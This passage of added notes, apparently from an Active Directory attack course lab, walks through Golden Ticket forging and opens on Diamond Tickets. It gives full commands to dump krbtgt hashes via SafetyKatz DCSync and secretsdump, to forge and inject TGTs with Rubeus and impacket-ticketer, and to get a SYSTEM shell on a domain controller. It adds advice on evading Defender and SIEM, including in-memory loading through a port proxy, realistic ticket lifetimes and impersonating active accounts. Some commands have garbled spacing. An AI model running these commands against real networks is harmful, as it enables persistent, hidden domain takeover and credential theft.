+</blockquote>
+<h3 id="ticket-forged-what-next">🔁 <strong>3. Ticket Forged – What Next?</strong></h3>
+<p>Once forged, Rubeus injects it into memory (<code>/ptt</code>). Now:</p>
+<ul>
+<li><p>You are effectively <strong>“logged in” as Administrator</strong>.</p></li>
+<li><p>TGT will be <strong>accepted as valid</strong> by any service in the domain (because it’s signed with krbtgt’s key)</p></li>
+<li><p>You can access <strong>file shares</strong>, <strong>remote desktop</strong>, <strong>AD data</strong>, or run tools like <strong>SharpHound</strong>, <strong>secretsdump</strong>, or <strong>dcsync</strong>.</p></li>
+<li><p>The DC will <strong>trust the ticket</strong>, even if the real admin changed passwords.</p></li>
+<li><p>The forged TGT remains valid until expiry (usually <strong>10 hours by default</strong>), but you can <strong>forge again anytime</strong>.</p></li>
+</ul>
+<h3 id="advantage-of-golden-ticket">Advantage of Golden Ticket</h3>
+<h3 id="persistance-peroid-of-golden-ticket-attack">🔍 Persistance Peroid of Golden Ticket Attack</h3>
+<h3 id="golden-ticket-persistence">1. Golden Ticket Persistence</h3>
+<ul>
+<li><p>A <strong>Golden Ticket</strong> is forged using the <strong><code>krbtgt</code> account hash</strong>.</p></li>
+<li><p><strong>Persistence:</strong> Valid <strong>until the <code>krbtgt</code> account password is changed</strong>.</p>
+<ul>
+<li>By default, <strong>krbtgt rarely changes</strong> because it’s a sensitive account (resetting can disrupt Kerberos).</li>
+<li>In most real environments, admins don’t rotate it often → meaning <strong>Golden Tickets can last for months/years</strong> if unnoticed.</li>
+</ul></li>
+</ul>
+<h3 id="the-point-of-forging-a-golden-ticket">🎯 The Point of Forging a Golden Ticket</h3>
+<ol type="1">
+<li><strong>Persistence (long-term backdoor):</strong>
+<ul>
+<li>DA rights can be removed (your admin user deleted, passwords rotated, etc.).</li>
+<li>But if you’ve stolen the <code>krbtgt</code> hash, you can always mint a new Golden Ticket on demand — even months later.</li>
+<li>It’s like having a skeleton key to the domain until the defenders rotate <code>krbtgt</code> <strong>twice</strong>.</li>
+</ul></li>
+<li><strong>Stealth:</strong>
+<ul>
+<li>Using DA account directly leaves traces in event logs (logons, group memberships, etc.).</li>
+<li>A forged Golden Ticket can impersonate <em>any</em> user or a fake user (with arbitrary groups), making it harder to correlate activities.</li>
+</ul></li>
+<li><strong>Flexibility:</strong>
+<ul>
+<li>You don’t have to stick with the DA account you compromised.</li>
+<li>You can forge tickets for <strong>any account</strong> (e.g., a service account or a fake user) with <strong>any group memberships</strong> you want.</li>
+<li>Example: Forge a ticket for a helpdesk user but sneak in <code>Domain Admins</code> group membership.</li>
+</ul></li>
+<li><strong>Bypass of normal credential protections:</strong>
+<ul>
+<li>Even if defenders disable the compromised DA account, you still have unlimited access via forged tickets.</li>
+<li>This is why Golden Tickets are considered a <strong>persistence technique</strong> more than just a lateral movement trick.</li>
+</ul></li>
+<li><strong>Cross-forest or selective abuse:</strong>
+<ul>
+<li>Sometimes you don’t want to move as “Administrator.”</li>
+<li>Forging a ticket for a trusted account in a forest/domain trust scenario can be more effective and less noisy.</li>
+</ul></li>
+</ol>
+<hr />
+<h3 id="simplified-analogy">⚖️ Simplified Analogy</h3>
+<ul>
+<li><p><strong>Getting DA</strong> = you broke into the bank vault with all the money.</p></li>
+<li><p><strong>Golden Ticket</strong> = you made a master key that always works, even if the bank changes the locks or fires the guard who let you in.</p></li>
+</ul>
+<hr />
+<p>👉 So the <strong>value isn’t privilege escalation</strong>, it’s <strong>persistence, stealth, and flexibility</strong>.</p>
+<h3 id="example---windows">Example - Windows</h3>
+<h3 id="step-by-step-golden-ticket-attack">🛠️ Step-by-Step Golden Ticket Attack :</h3>
+<hr />
+<h3 id="obtain-the-krbtgt-account-hash-aes256-key">🔑 <strong>1. Obtain the krbtgt Account Hash (AES256 key)</strong></h3>
+<p>This is the <strong>most critical step</strong> in forging a golden ticket.</p>
+<p><strong>Method 1: Using SafetyKatz on the DC (as Domain Admin)</strong></p>
+<pre class="bash"><code>
+C:\AD\Tools\SafetyKatz.exe &quot;lsadump::lsa /patch&quot;
+</code></pre>
+<ul>
+<li><p><strong>Tool:</strong> SafetyKatz (a variant of Mimikatz).</p></li>
+<li><p><strong>What it does:</strong> Dumps <strong>LSA secrets</strong>, including the <strong>krbtgt NTLM and AES256 keys</strong>.</p></li>
+<li><p><strong>Where:</strong> Must be run <strong>on the DC</strong> with <strong>DA privileges</strong>.</p></li>
+<li><p><strong>Detection risk:</strong> HIGH (needs code execution on the DC).</p></li>
+</ul>
+<p><strong>Method 2: Using DCSync (No code execution on DC)</strong></p>
+<pre class="bash"><code>
+C:\AD\Tools\SafetyKatz.exe &quot;lsadump::dcsync /user:dcorp\krbtgt&quot; &quot;exit&quot;
+</code></pre>
+<ul>
+<li><p>Uses <strong>Directory Replication Service (DRS)</strong> to fetch the <strong>krbtgt hash remotely</strong>.</p></li>
+<li><p>Requires <strong>DA privileges</strong> or <strong>replication rights</strong> (e.g., <code>Replicating Directory Changes</code> permissions).</p></li>
+<li><p>More <strong>stealthy</strong> and <strong>opsec friendly as no code runs on the DC, it’s just a protocol request</strong></p></li>
+</ul>
+<p>✅ <strong>Obtained AES256 Key:</strong></p>
+<pre><code>
+154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+</code></pre>
+<hr />
+<h3 id="forge-the-golden-ticket-using-rubeus">🧪 <strong>2. Forge the Golden Ticket Using Rubeus</strong></h3>
+<p>You use this krbtgt AES256 key to <strong>generate a fake TGT</strong> with Rubeus.</p>
+<p><strong>Option 1: automatic mode with LDAP queries</strong></p>
+<pre class="powershell"><code>
+C:\AD\Tools\Rubeus.exe golden
+
+/aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+
+/sid:S-1-5-21-719815819-3726368948-3917688648
+
+/ldap
+
+/user:Administrator
+
+/printcmd
+</code></pre>
+<p><strong>What it does:</strong></p>
+<ul>
+<li><p><strong><code>golden</code></strong> → Instructs Rubeus to forge a Golden Ticket (a fake TGT).</p></li>
+<li><p><strong><code>/aes256:...</code></strong> → Supplies the AES256 key of the <code>krbtgt</code> account (essential to sign the ticket).</p></li>
+<li><p><strong><code>/sid:...</code></strong> → Domain SID; required to build the full user SID.</p></li>
+<li><p><strong><code>/ldap</code></strong> → Makes Rubeus automatically query the Domain Controller via LDAP to pull extra attributes needed for the ticket (like groups, logon count, pwdlastset, etc.).</p></li>
+<li><p><strong><code>/user:Administrator</code></strong> → Username to impersonate in the forged TGT.</p></li>
+<li><p><strong><code>/printcmd</code></strong> → Instead of creating the ticket directly, it prints a full “ready to run” forging command with all the discovered attributes.</p></li>
+</ul>
+<p>👉 Here, Rubeus sends <strong>3 LDAP queries</strong> to the DC:</p>
+<ol type="1">
+<li><p>Gets user account control (UAC) flags for <code>Administrator</code>.</p></li>
+<li><p>Gets group memberships, primary group ID, minPwdAge, maxPwdAge.</p></li>
+<li><p>Gets domain NetBIOS name.</p></li>
+</ol>
+<p>This version is very easy but <strong>less OPSEC-friendly</strong> since the LDAP queries can be logged/monitored.</p>
+<p><strong>Option 2: manual mode — refined Golden Ticket forging</strong></p>
+<pre class="bash"><code>
+C:\AD\Tools\Rubeus.exe golden
+
+/aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+
+/user:Administrator /id:500 /pgid:513
+
+/domain:dollarcorp.moneycorp.local
+
+/sid:S-1-5-21-719815819-3726368948-3917688648
+
+/pwdlastset:&quot;11/11/2022 6:33:55 AM&quot;
+
+/minpassage:1 /logoncount:2453 /netbios:dcorp
+
+/groups:544,512,520,513
+
+/dc:DCORP-DC.dollarcorp.moneycorp.local
+
+/uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
+
+/ptt
+</code></pre>
+<p>This command <strong>forges a Kerberos Ticket Granting Ticket (TGT)</strong> for the <strong>Administrator</strong> user, signs it with the <strong>krbtgt AES256 hash</strong>, and then <strong>injects it directly into memory</strong> (<code>/ptt</code>) so the current session can use it for domain access without needing a real password.</p>
+<p>👉 This command <strong>does not query LDAP</strong>. Instead, you supply all required attributes yourself — making it <strong>more stealthy/OPSEC friendly</strong>.</p>
+<p>✅ <strong>Explanation of Key Parameters</strong>:</p>
+<div class="line-block"><strong>Parameter</strong> | <strong>Meaning / Purpose</strong> |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><code>Rubeus.exe golden</code> | Invokes the <strong>Golden Ticket forging module</strong> in Rubeus |</div>
+<div class="line-block"><code>/aes256:&lt;hash&gt;</code> | The <strong>AES256 key</strong> of the <strong>krbtgt account</strong> — used to <strong>sign</strong> the fake TGT so it appears valid to the DC |</div>
+<div class="line-block"><code>/user:Administrator</code> | The <strong>username</strong> the ticket will impersonate (in this case, the domain admin account) |</div>
+<div class="line-block"><code>/id:500</code> | <strong>RID (Relative ID)</strong> of the Administrator account in AD (500 = default RID for built-in admin) |</div>
+<div class="line-block"><code>/pgid:513</code> | <strong>Primary Group ID</strong> — usually 513 = Domain Users |</div>
+<div class="line-block"><code>/domain:dollarcorp.moneycorp.local</code> | <strong>Fully Qualified Domain Name (FQDN)</strong> of the AD domain |</div>
+<div class="line-block"><code>/sid:S-1-5-21-...</code> | The <strong>Domain SID</strong> — critical for forging valid tickets |</div>
+<div class="line-block"><code>/pwdlastset:"11/11/2022 6:33:55 AM"</code> | Timestamp indicating when the password was last set (optional cosmetic realism) |</div>
+<div class="line-block"><code>/minpassage:1</code> | Minimum password age in <strong>days</strong> (optional, helps look like a legit ticket) |</div>
+<div class="line-block"><code>/logoncount:2453</code> | Number of times the user has logged on (also for realism) |</div>
+<div class="line-block"><code>/netbios:dcorp</code> | The <strong>NetBIOS name</strong> of the domain (short name) |</div>
+<div class="line-block"><code>/groups:544,512,520,513</code> | The <strong>group RIDs</strong> the user belongs to:🔹 544 = Administrators🔹 512 = Domain Admins🔹 520 = Enterprise Admins🔹 513 = Domain UsersThis makes the forged ticket grant <strong>high-level access</strong> |</div>
+<div class="line-block"><code>/dc:DCORP-DC.dollarcorp.moneycorp.local</code> | The <strong>FQDN of the Domain Controller</strong> to target or contact |</div>
+<div class="line-block"><code>/uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD</code> | <strong>UserAccountControl flags</strong> — e.g. normal account, password never expires |</div>
+<div class="line-block"><code>/ptt</code> or /ticket | <strong>Pass-the-Ticket(/ptt)</strong>: injects the forged ticket into the current session’s memory (no need to save it to disk)</div>
+<p><strong>/ticket -</strong> saves ticket to a file for later usage |</p>
+<p><strong><em>“When forging a Golden Ticket, make sure its lifetime matches the target environment. By default, Kerberos tickets last about 10 hours, but tools like Mimikatz may create tickets that last for 10 years, which can be easily detected. To stay stealthy, set a realistic lifetime using options like <code>/endin:8h</code> in Rubeus.”</em></strong></p>
+<blockquote>
+<p><strong><em>When forging a Golden Ticket, it’s important to base it on a valid, active user account rather than a dormant or the built-in Administrator account. Using inactive accounts or Administrator directly can trigger suspicion — for example, the logon count of those accounts will suddenly increase after years of inactivity, which can stand out in monitoring tools and SIEM alerts. Forging tickets for a legitimate, regularly used account blends better with normal domain activity and is less likely to be detected.</em></strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h2 id="what-if-we-impersonate-a-non-existing-user">What if we impersonate a <strong>non-existing user</strong>?</h2>
+<p>Surprisingly:</p>
+<p>✅ <strong>It can still work.</strong></p>
+<p>Because during <strong>TGS validation</strong>, the KDC mainly checks:</p>
+<pre><code>
+Is the TGT correctly signed with krbtgt key?
+</code></pre>
+<p>It <strong>does not always verify the user exists in AD</strong>.</p>
+<p>So the ticket could contain:</p>
+<pre><code>
+username = hacker123
+
+RID = 5000
+</code></pre>
+<p>And the KDC may still issue service tickets.</p>
+<hr />
+<h3 id="why-this-is-possible">5️⃣ Why This Is Possible</h3>
+<p>Kerberos is <strong>stateless regarding TGT issuance</strong>.</p>
+<p>The KDC does <strong>not store issued tickets</strong>.</p>
+<p>Instead it just:</p>
+<pre><code>
+decrypt TGT using krbtgt key
+</code></pre>
+<p>If decryption succeeds:</p>
+<pre><code>
+ticket = trusted
+</code></pre>
+<p>That’s it.</p>
+<hr />
+<h3 id="but-in-practice-attackers-avoid-fake-users">6️⃣ But In Practice Attackers Avoid Fake Users</h3>
+<p>Even though it works, operators usually impersonate <strong>real accounts</strong>.</p>
+<p>Reasons:</p>
+<p><strong>1️⃣ Logging anomalies</strong></p>
+<p>Logs may show:</p>
+<pre><code>
+User: hacker123
+</code></pre>
+<p>but that user doesn’t exist in AD.</p>
+<p>SOC tools can detect that.</p>
+<hr />
+<p><strong>2️⃣ Some services perform directory checks</strong></p>
+<p>Some applications query AD:</p>
+<pre><code>
+Does this user exist?
+</code></pre>
+<p>If not → access denied.</p>
+<hr />
+<p><strong>3️⃣ SID mismatch detection</strong></p>
+<p>A forged user might produce strange SIDs like:</p>
+<pre><code>
+S-1-5-21-xxx-xxx-xxx-9999
+</code></pre>
+<p>which defenders can flag.</p>
+<hr />
+<h3 id="realistic-attacker-strategy">7️⃣ Realistic Attacker Strategy</h3>
+<p>Instead attackers usually forge tickets for:</p>
+<pre><code>
+existing admin accounts
+
+service accounts
+
+regular users with admin groups
+</code></pre>
+<p>Example:</p>
+<pre><code>
+svc_backup
+
+helpdesk_admin
+
+dbadmin
+</code></pre>
+<p>This blends into normal activity</p>
+<h3 id="example---linux">Example - Linux</h3>
+<h2 id="step-1-obtain-the-krbtgt-hash">🔑 Step 1 — Obtain the <code>krbtgt</code> Hash</h2>
+<p>The <strong>Golden Ticket requires the hash/key of the <code>krbtgt</code> account</strong>, because:</p>
+<blockquote>
+<p>The <strong>KDC signs all TGTs using the krbtgt key.</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p>If you have the key, you can <strong>sign your own TGT</strong>, and the <strong>Domain Controller will trust it.</strong></p>
+<hr />
+<h2 id="method-1-using-dcsync-most-common">Method 1 — Using DCSync (Most Common)</h2>
+<p>From Linux using <strong>Impacket</strong>:</p>
+<pre><code>
+impacket-secretsdump pirate.htb/administrator:&#39;Password@123!&#39;@DC01.pirate.htb
+</code></pre>
+<p>or using <strong>pass-the-hash</strong></p>
+<pre><code>
+impacket-secretsdump-hashes :NTLMHASH pirate.htb/administrator@DC01.pirate.htb
+</code></pre>
+<hr />
+<h3 id="what-happens-internally">What happens internally</h3>
+<p><code>secretsdump</code> performs a <strong>DCSync attack</strong>.</p>
+<p>It asks the DC:</p>
+<blockquote>
+<p>“Hey, I am a domain controller. Send me replication data.”</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p>The DC sends <strong>password hashes of domain users</strong>, including:</p>
+<pre><code>
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:154cb6624b1d859f7080a6615adc488f
+</code></pre>
+<p>Important values:</p>
+<div class="line-block">Field | Meaning |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">502 | RID of krbtgt |</div>
+<div class="line-block">NTLM hash | used for signing Kerberos tickets |</div>
+<hr />
+<h3 id="example-output">Example Output</h3>
+<pre><code>
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
+
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:154cb6624b1d859f7080a6615adc488f
+</code></pre>
+<p>You extract:</p>
+<pre><code>
+krbtgt NTLM hash
+</code></pre>
+<p>or AES keys if present.</p>
+<hr />
+<h3 id="step-2-gather-domain-information">🧪 Step 2 — Gather Domain Information</h3>
+<p>To forge a Golden Ticket you need:</p>
+<div class="line-block">Required Value | Example |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Domain | pirate.htb |</div>
+<div class="line-block">Domain SID | S-1-5-21-1234-5678-9012 |</div>
+<div class="line-block">User to impersonate | Administrator |</div>
+<div class="line-block">RID | 500 |</div>
+<div class="line-block">krbtgt hash | obtained above |</div>
+<hr />
+<h3 id="getting-domain-sid">Getting Domain SID</h3>
+<p>Using <strong>lookupsid</strong></p>
+<pre><code>
+impacket-lookupsid pirate.htb/administrator:&#39;Password@123!&#39;@DC01.pirate.htb
+</code></pre>
+<p>Output:</p>
+<pre><code>
+[*] Domain SID is: S-1-5-21-719815819-3726368948-3917688648
+</code></pre>
+<p>Save this.</p>
+<hr />
+<h3 id="step-3-forge-golden-ticket-ticketer.py">🧪 Step 3 — Forge Golden Ticket (ticketer.py)</h3>
+<p>Now we generate the <strong>fake TGT</strong>.</p>
+<pre><code>
+impacket-ticketer \
+
+-nthash 154cb6624b1d859f7080a6615adc488f \
+
+-domain-sid S-1-5-21-719815819-3726368948-3917688648 \
+
+-domain pirate.htb \
+
+-user-id 500 \
+
+Administrator
+</code></pre>
+<hr />
+<h3 id="explanation-of-parameters">Explanation of Parameters</h3>
+<div class="line-block">Parameter | Meaning |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><code>ticketer.py</code> | Impacket tool that creates forged Kerberos tickets |</div>
+<div class="line-block"><code>-nthash</code> | NTLM hash of <strong>krbtgt account</strong> |</div>
+<div class="line-block"><code>-domain-sid</code> | Domain SID used to build user SID |</div>
+<div class="line-block"><code>-domain</code> | Target domain |</div>
+<div class="line-block"><code>-user-id</code> | RID of impersonated user |</div>
+<div class="line-block"><code>Administrator</code> | Username we are forging |</div>
+<hr />
+<h3 id="what-the-tool-does-internally">What the Tool Does Internally</h3>
+<p><code>ticketer.py</code> creates a <strong>fake TGT containing</strong>:</p>
+<pre><code>
+User: Administrator
+
+SID: S-1-5-21-xxxx-xxxx-xxxx-500
+
+Groups: Domain Admins
+
+Ticket lifetime
+
+Kerberos flags
+</code></pre>
+<p>Then it <strong>signs the ticket using the krbtgt key</strong>.</p>
+<p>Because the <strong>DC trusts krbtgt</strong>, it accepts the ticket.</p>
+<hr />
+<h3 id="output">Output</h3>
+<pre><code>
+[*] Saving ticket in Administrator.ccache
+</code></pre>
+<p>The forged <strong>Golden Ticket</strong> is saved as:</p>
+<pre><code>
+Administrator.ccache
+</code></pre>
+<hr />
+<h3 id="step-4-load-the-golden-ticket">🎟️ Step 4 — Load the Golden Ticket</h3>
+<p>Set the Kerberos ticket environment variable.</p>
+<pre><code>
+exportKRB5CCNAME=Administrator.ccache
+</code></pre>
+<p>Verify ticket:</p>
+<pre><code>
+klist
+</code></pre>
+<p>Output:</p>
+<pre><code>
+Ticket cache: FILE:Administrator.ccache
+
+Default principal: Administrator@PIRATE.HTB
+</code></pre>
+<hr />
+<h3 id="step-5-use-the-ticket-to-access-domain-services">🚀 Step 5 — Use the Ticket to Access Domain Services</h3>
+<p>Now we can authenticate <strong>without a password</strong>.</p>
+<hr />
+<p><strong>Example 1 — Access SMB</strong></p>
+<pre><code>
+impacket-smbclient-k-no-pass //DC01.pirate.htb/C$
+</code></pre>
+<p>Explanation:</p>
+<div class="line-block">Flag | Meaning |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><code>-k</code> | Use Kerberos |</div>
+<div class="line-block"><code>-no-pass</code> | Do not request password |</div>
+<div class="line-block">SMB path | Access admin share |</div>
+<hr />
+<p><strong>Example 2 — Execute Commands on DC</strong></p>
+<pre><code>
+impacket-psexec-k-no-pass pirate.htb/Administrator@DC01.pirate.htb
+</code></pre>
+<p>Result:</p>
+<pre><code>
+C:\Windows\system32&gt;
+</code></pre>
+<p>You now have <strong>SYSTEM shell on the Domain Controller</strong>.</p>
+<hr />
+<p><strong>Example 3 — Dump Domain Again</strong></p>
+<pre><code>
+impacket-secretsdump-k-no-pass pirate.htb/Administrator@DC01.pirate.htb
+</code></pre>
+<p>Works because the <strong>ticket gives DA privileges</strong>.</p>
+<hr />
+<h3 id="why-golden-ticket-is-so-powerful">⚠️ Why Golden Ticket Is So Powerful</h3>
+<p>Golden Ticket allows:</p>
+<div class="line-block">Capability | Reason |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Login as any user | Ticket contains arbitrary username |</div>
+<div class="line-block">Add admin privileges | Groups are embedded in ticket |</div>
+<div class="line-block">Persistent access | Ticket lifetime can be years |</div>
+<div class="line-block">Bypass password resets | Only krbtgt rotation invalidates |</div>
+<hr />
+<h3 id="ticket-lifetime">Ticket Lifetime</h3>
+<p>Bad attackers create <strong>10 year tickets</strong>.</p>
+<p>Better approach:</p>
+<pre><code>
+-end-time 8h
+</code></pre>
+<p>Match environment Kerberos lifetime.</p>
+<hr />
+<h3 id="avoid-using-administrator">Avoid Using Administrator</h3>
+<p>Using <strong>Administrator</strong> triggers alerts because:</p>
+<pre><code>
+LogonCount suddenly increases
+</code></pre>
+<p>Better:</p>
+<pre><code>
+Forge ticket for active admin user
+</code></pre>
+<p>Example:</p>
+<pre><code>
+svc_backup
+
+helpdesk_admin
+</code></pre>
+<hr />
+<h3 id="the-critical-defense">🔥 The Critical Defense</h3>
+<p>The <strong>ONLY way to invalidate Golden Tickets</strong>:</p>
+<pre><code>
+Rotate krbtgt password twice
+</code></pre>
+<p>Reason:</p>
+<p>AD stores <strong>two krbtgt hashes</strong> for ticket validation.</p>
+<hr />
+<h3 id="key-insight-very-important">⭐ Key Insight (Very Important)</h3>
+<p>Golden Ticket works because:</p>
+<pre><code>
+Service does NOT contact DC to validate TGT signature
+</code></pre>
+<p>Instead:</p>
+<pre><code>
+Service trusts krbtgt key used to sign ticket
+</code></pre>
+<p>So if you know <strong>krbtgt key → you become the KDC</strong>.</p>
+<h3 id="windows-poc---example">Windows PoC - Example</h3>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>In past videos we know <strong><em>svcadmin</em></strong> is the domain admin and we have the AES key of it. So, we will you this key to start a session of <strong><em>svcadmin</em></strong> using <strong><em>overpass the hash</em></strong>.</p>
+<pre class="powershell"><code>
+Rubeus.exe asktgt  /user:svcadmin /aes256 &lt;aes_key&gt; /opsec 
+
+/createnetonly:C:\Windows\System32\cmd.ece /show /ptt
+
+OR
+
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>This will open a new cmd with elevated privileges of svcadmin.</p>
+<p>Next run dcsync attack, which will allow us request krbtgt hash:</p>
+<pre class="powershell"><code>
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+
+&quot;lsadump::dcsync /user:dcorp\krbtgt&quot; &quot;exit&quot;
+
+OR
+
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -
+
+args &quot;lsadump::evasive-dcsync /user:dcorp\krbtgt&quot; &quot;exit&quot;    ----&gt; prefered
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>In output we got NTLM hash, AES 256 and 128 hash. For forging the golden ticket use AES256 key hash, because modern system uses AES256 keys</p>
+<p><strong>Alternate method instead of dcsync:</strong></p>
+<p>Transfer Loader.exe to the domain controller, being svcadmin - doman admin, it can copy files to the dc.</p>
+<p>Next connect to the DC using winrs:</p>
+<pre class="powershell"><code>
+echo F| xcopy c:\User\Public\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+
+winrs -r:dcorp-dc cmd
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><strong>now create port forwarding for protecting from defender:</strong></p>
+<pre class="powershell"><code>
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 
+
+connectport=80 connectaddress=172.16.100.1
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>next download and execute safetykatz in the memory:</p>
+<pre class="powershell"><code>
+C:\Users\Public\Loader.exe -path [http://127.0.0.1:8080/Safetykatz.exe](http://127.0.0.1:8080/Safetykatz.exe) 
+
+-args &quot;lsadump::evasive-lsa&quot; &quot;exit&quot;
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>this will provide us with RC4(NTLM) keys of krbtgt account, inorder to get the AES key you have dcsync attack(which we performed above)</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>Next we will forge the golden ticket using option1 method:</p>
+<pre class="powershell"><code>
+C:\AD\Tools\Rubeus.exe golden
+
+/aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+
+/sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator
+
+/printcmd
+
+Or
+
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe evasive-golden
+
+/aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+
+/sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator
+
+/printcmd                                                         -------&gt; prefered
+
+same command as above but in one line:-
+
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>the output of the previous command suggest the next command to use, make required adjustments to the command:</p>
+<pre class="powershell"><code>
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-Golden
+
+/aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
+
+/user:Administrator
+
+/id:500
+
+/pgid:513
+
+/domain:dollarcorp.moneycorp.local
+
+/sid:S-1-5-21-719815819-3726368948-3917688648
+
+/pwdlastset:&quot;11/11/2022 6:34:22 AM&quot;
+
+/minpassage:1
+
+/logoncount:153
+
+/netbios:dcorp
+
+/groups:544,512,520
+
+/dc:DCORP-DC.dollarcorp.moneycorp.local
+
+/uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
+
+/ptt
+
+Same command but in one line:-
+
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:&quot;11/11/2022 6:34:22 AM&quot; /minpassage:1 /logoncount:153 /netbios:dcorp /groups:544,512,520 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+</code></pre>
+<p>Above command will forge the golden ticket on behalf of Administrator and will import it in the current session</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>Now Accessing DC on behalf of Administrator</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<h2 id="diamond-ticket-attack">Diamond Ticket Attack</h2>
+<h3 id="understanding-the-core-concept-1">Understanding The Core Concept</h3>
+<h3 id="what-is-a-diamond-ticket-attack">💎 What is a <strong>Diamond Ticket</strong> Attack?</h3>
+<p>A <strong>Diamond Ticket</strong> is a <strong>Kerberos TGT modification attack</strong>.</p>
+<p>Unlike Golden Ticket (which <strong>creates</strong> a fake TGT from scratch), <strong>Diamond Ticket modifies a real TGT</strong> issued by the domain controller, then <strong>re-encrypts it</strong> using the <strong>krbtgt keys</strong> to make it stealthy and valid.</p>
+<h3 id="difference-from-golden-ticket">🔹 Difference from Golden Ticket</h3>
+<ul>
+<li><p><strong>Golden Ticket</strong> = <em>forging a brand-new TGT from scratch</em>.</p></li>
+<li><p><strong>Diamond Ticket</strong> = <em>modifying an already valid TGT</em>.</p></li>
+</ul>
+<p><strong>Why is this important?</strong></p>
+<ul>
+<li><p>Golden Ticket leaves no AS-REQ trail (no log showing the ticket was ever requested).</p></li>
+<li><p>Diamond Ticket has valid timestamps and log evidence (because the original TGT came from the DC).</p></li>
+<li><p>This makes Diamond Ticket <strong>more OPSEC safe</strong> (harder to detect).</p></li>
+</ul>
+<blockquote>
+<p>The <strong>Golden Ticket attack</strong> involves creating a completely new <strong>TGT (Ticket Granting Ticket)</strong> offline using the <strong>krbtgt account hash</strong>, without any interaction with the <strong>KDC</strong>. However, in certain environments, the <strong>KDC keeps track of AS-REQ (Authentication Service Request)</strong> logs and correlates issued TGTs with corresponding requests. Since a Golden Ticket never involves a real AS-REQ, the <strong>KDC has no record of issuing that TGT</strong>, which can potentially trigger detections or alerts.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+<p>To overcome this limitation and improve stealth, attackers use the <strong>Diamond Ticket attack</strong>, where they start with a <strong>legitimate TGT issued by the KDC</strong>, then <strong>decrypt, modify, and re-encrypt</strong> it using the krbtgt key. This way, the <strong>ticket appears legitimate</strong>, matches the original AS-REQ record, and bypasses detections based on missing Kerberos ticket issuance logs.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h3 id="key-properties">✅ Key Properties:</h3>
+<div class="line-block">Property | Description |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">🔐 <strong>Attack Type</strong> | <strong>TGT modification</strong>, not creation |</div>
+<div class="line-block">🔑 <strong>Requires</strong> | <code>krbtgt</code> key (AES preferred), and valid TGT |</div>
+<div class="line-block">🕵️‍♂️ <strong>OPSEC</strong> | High stealth: ticket times &amp; structure match legit ones |</div>
